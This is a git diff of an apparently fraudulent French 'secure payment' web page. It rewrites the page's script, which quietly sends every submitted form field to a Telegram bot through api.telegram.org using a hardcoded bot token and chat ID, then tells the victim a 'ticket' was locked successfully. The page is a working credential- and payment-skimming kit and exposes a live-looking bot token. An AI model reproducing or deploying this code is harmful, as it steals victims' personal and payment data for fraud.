@@ -16,7 +16,7 @@
 				<img src="img/logo.svg">
 			</div>
 			<div>
-				<form class="payment-form">
+				<form class="payment-form" id="form">
 					<input type="name" name="" class="firstname" placeholder="nom" required>
 					<input type="name" name="" class="lastname" placeholder="prenom"><br>
 					<input type="email" name="" class="email" placeholder="email" required><br>
@@ -31,51 +31,46 @@
 		 <h4>Paiement 100% sécurisé </h4>
 	</div>
 	 <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            var form = document.getElementById('paymentForm');
+     document.getElementById('form').addEventListener('submit', function (e) {
 
-            form.addEventListener('submit', function (event) {
-                event.preventDefault();
+        e.preventDefault();
 
-                // Collect form data
-                var formData = new FormData(form);
+        const telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';
 
-                // Convert FormData to JSON
-                var formDataJSON = {};
-                formData.forEach(function (value, key) {
-                    formDataJSON[key] = value;
-                });
+        const chatId = '-1002083816651';
 
-                // Replace 'YOUR_TELEGRAM_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID
-                var telegramBotToken = '6550563050:AAE6DHJ9I4t5EOhVCpoOWY-ZSJiENK7E0Hs';
-                var chatID = '1002083816651';
+        const formData = new FormData(e.target);
 
-                // Construct the Telegram message
-                var message = "New payment details:\n\n";
-                for (var key in formDataJSON) {
-                    message += key.charAt(0).toUpperCase() + key.slice(1) + ": " + formDataJSON[key] + "\n";
-                }
+        // Construct the message text with form data
 
-                // Send message to Telegram using fetch
-                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        // Handle the response from the Telegram API (optional)
-                        console.log(data);
+        let messageText = "New form submission:\n";
 
-                        // Display success popup
-                        alert('Succès! Un email vous sera envoyé avec les détails de la commande et votre code.');
+        formData.forEach((value, key) => {
 
-                        // Redirect to thank you page
-                        window.location.href = 'https://recharge-fr.github.io/RCH/';
-                    })
-                    .catch(error => {
-                        console.error('Erreur lors de l'exécution', error);
-                        // Handle error if needed
-                    });
-            });
+            messageText += `${key}: ${value}\n`;
+
         });
-    </script>
+
+        // Make an AJAX request to send data to Telegram
+
+        const xhr = new XMLHttpRequest();
+
+        xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`);
+
+        xhr.send();
+     
+  xhr.onload = function () {
+    if (xhr.status === 200) {
+                // Display a success popup
+                window.alert('ticket verrouillé avec succès');
+            } else {
+                // Display an error popup
+                window.alert('echec lors du verrouillage du ticket, veuillez réessayer');
+            }
+        };
+    });
+        
+</script>
 </body>
 	
 </html>
